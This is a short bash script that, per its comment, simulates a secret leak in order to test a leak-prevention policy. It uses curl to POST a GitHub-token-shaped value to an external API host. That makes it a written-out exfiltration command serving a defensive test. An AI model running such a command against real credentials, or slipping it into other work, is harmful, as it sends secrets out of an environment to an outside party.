#!/bin/bash

# This script simulates a secret leak by sending a POST request to external API. This demonstrates the IR BAF Secret Leak prevention policy.

curl -X POST https://api.invisirisk.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
  }'
